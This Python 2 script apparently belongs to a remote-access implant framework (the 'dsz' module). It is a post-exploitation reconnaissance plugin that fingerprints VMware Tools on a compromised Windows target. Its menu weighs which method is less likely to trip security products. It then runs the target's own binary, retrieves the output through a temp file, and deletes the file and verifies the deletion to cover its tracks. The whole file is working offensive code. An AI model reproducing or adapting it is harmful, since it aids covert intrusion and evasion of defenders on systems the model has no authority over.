
import dsz, dsz.lp, os, StringIO, dsz.file, re, shutil

def main():
    vmCheck()

def vmCheck():
    possibleFiles = ['vmwaretoolboxcmd.exe', 'VMwareService.exe']
    version = '1.0.0.0'
    logDir = dsz.lp.GetLogsDirectory()
    (tarWinDir, tarSysDir) = dsz.path.windows.GetSystemPaths()
    dsz.control.echo.Off()
    vmVersionStr = ''
    regCmd = 'registryquery -hive L -key "software\\VMware, Inc.\\VMware Tools" -value Installpath'
    if dsz.cmd.Run(regCmd, dsz.RUN_FLAG_RECORD):
        safePrint('+--------------------------------------------------------------------------------+')
        safePrint(('|  vm_touch.py version: ' + version))
        [vmWarePath] = dsz.cmd.data.Get('key::value::value', dsz.TYPE_STRING)
        for i in possibleFiles:
            if dsz.file.Exists((vmWarePath + i)):
                vmWareExe = (vmWarePath + i)
                menuSelection = printMenu(vmWareExe)
                runCmd = 'NONE'
                if (1 == menuSelection):
                    runCmd = (('run -command "' + vmWareExe) + ' -v" -redirect')
                    safePrint(('|  RUNNING COMMAND:\n|    ' + runCmd))
                    if dsz.cmd.Run(runCmd, dsz.RUN_FLAG_RECORD):
                        [outputVal] = dsz.cmd.data.Get('processoutput::output', dsz.TYPE_STRING)
                        vmVersion = re.match('.*?(\\d.*?\\s).*', outputVal)
                        vmVersionStr = vmVersion.group(1).rstrip()
                if (2 == menuSelection):
                    tempFile = (tarWinDir + '\\temp\\vmdata.txt')
                    for i in range(10):
                        if dsz.file.Exists(tempFile):
                            safePrint((('|  TEMP FILE ' + tempFile) + ' ALREADY EXISTS!'))
                            tempFile = (((tarWinDir + '\\temp\\vmdata') + str(i)) + '.txt')
                        else:
                            break
                    if (tempFile == (tarWinDir + '\\temp\\vmdata9.txt')):
                        safePrint('|  EXCEEDED THE NUMBER OF TEMP FILENAMES?!?!?!?... BAILING!')
                        safePrint('+--------------------------------------------------------------------------------+')
                        return 0
                    runCmd = (((('run -command "cmd /C \\"' + vmWareExe) + '\\" -v > ') + tempFile) + '"')
                    safePrint(('|  RUNNING COMMAND:\n|    ' + runCmd))
                    if dsz.cmd.Run(runCmd, dsz.RUN_FLAG_RECORD):
                        runCmd = (('get ' + tarWinDir) + '\\temp\\vmdata.txt')
                        safePrint(('|  RUNNING COMMAND:\n|    ' + runCmd))
                        if dsz.cmd.Run(runCmd, dsz.RUN_FLAG_RECORD):
                            [getFile] = dsz.cmd.data.Get('filelocalname::localname', dsz.TYPE_STRING)
                            try:
                                getFileComplete = ((logDir + '\\GetFiles\\') + getFile)
                                safePrint(('|  ATTEMPTING TO OPEN LOCAL FILE:\n|    ' + getFileComplete))
                                outFilePtr = open(getFileComplete)
                            except:
                                safePrint('UNABLE TO OPEN LOCAL FILE FOR PARSING!')
                            for line in outFilePtr:
                                vmVersion = re.match('.*?(\\d.*?\\s).*', line)
                                if vmVersion:
                                    vmVersionStr = vmVersion.group(1).rstrip()
                            outFilePtr.close()
                        else:
                            safePrint('FAILED TO GET FILE FOR PARSING')
                        runCmd = ('delete -file ' + tempFile)
                        safePrint(('|  RUNNING COMMAND:\n|    ' + runCmd))
                        if (not dsz.cmd.Run(runCmd, dsz.RUN_FLAG_RECORD)):
                            safePrint((('|  !!! FAILED TO DELETE: ' + tempFile) + '!!!!s!'))
                    else:
                        safePrint(('FAILED TO RUN COMMAND: ' + runCmd))
                    if dsz.file.Exists(tempFile):
                        safePrint(('!!! VERIFICATION OF DELETE FAILED !!!\n|    PLEASE MANUALLY DELETE: ' + tempFile))
                    else:
                        safePrint(('|  VERIFIED DELETION OF FILE:\n|    ' + tempFile))
                if (3 == menuSelection):
                    safePrint('|  EXITING')
                if (not (vmVersionStr == '')):
                    safePrint(('|  VMWare Tools Version:\n|    ' + vmVersionStr))
                    try:
                        vmXmlFilePtr = open((logDir + '\\vmwaredata.xml'), 'w')
                        vmXmlFilePtr.write('<vmware_data>\n')
                        vmXmlFilePtr.write((('\t<vmware_version>' + vmVersionStr) + '</vmware_version>\n'))
                        vmXmlFilePtr.write((('\t<vmware_executable>' + vmWareExe) + '</vmware_executable>\n'))
                        vmXmlFilePtr.write('</vmware_data>\n')
                        vmXmlFilePtr.close()
                        safePrint('|  WROTE DATA TO FILE- THANKS FOR HELPING!')
                    except:
                        safePrint('FAILED TO WRITE DATA TO FILE')
                safePrint('+--------------------------------------------------------------------------------+')
    dsz.control.echo.On()

def printMenu(exeFile):
    safePrint('+--------------------------------------------------------------------------------+')
    safePrint('|                      !!!!PLEASE READ!!!!!                                      |')
    safePrint('|  I see that there is an installation of VMWare Tools, and I would like to      |')
    safePrint('|  investigate the installation type.  There are two ways to do this:            |')
    safePrint('|  BOTH involve running an executable already on the box; one method uses        |')
    safePrint('|  -redirect to catch the output from the binary, another avoids -redirect by    |')
    safePrint('|  writing the output to a file in the temp directory and then getting/deleting  |')
    safePrint('|  the file.  PLEASE UNDERSTAND THE RISKS ASSOCIATED WITH EACH OF THESE METHODS! |')
    safePrint('+--------------------------------------------------------------------------------+')
    safePrint(('|  I want to run: ' + exeFile))
    safePrint(('|  You are:       ' + myProc()))
    safePrint('+--------------------------------------------------------------------------------+')
    safePrint('| PLEASE SELECT FROM THE FOLLOWING:')
    safePrint('|   [1] THIS IS A PSP THAT ALLOWS THE EXECUTION OF MACHINE EXECUTABLES WITH THE -redirect OPTION')
    safePrint('|   [2] THIS IS A PSP THAT CATCHES THE -redirect, BUT IS OK WITH CREATING A FILE IN TEMP')
    safePrint("|   [3] I DO NOT WANT TO RUN THE TARGET'S BINARY (EXIT HERE.)")
    safePrint('+--------------------------------------------------------------------------------+')
    try:
        menuChoice = int(input())
    except:
        safePrint("that wasn't a number")
        printMenu(exeFile)
    if (menuChoice > 3):
        print 'not a valid option'
        printMenu(exeFile)
    return menuChoice

def myProc():
    strCmd = 'processinfo'
    dsz.control.echo.Off()
    dsz.cmd.Run(strCmd, dsz.RUN_FLAG_RECORD)
    modVal = dsz.cmd.data.Get('processinfo::modules::module::modulename', dsz.TYPE_STRING)
    iAm = modVal[0].split('\\')
    return iAm[(len(iAm) - 1)]

def safePrint(strInput):
    print strInput.encode('utf8')
if (__name__ == '__main__'):
    main()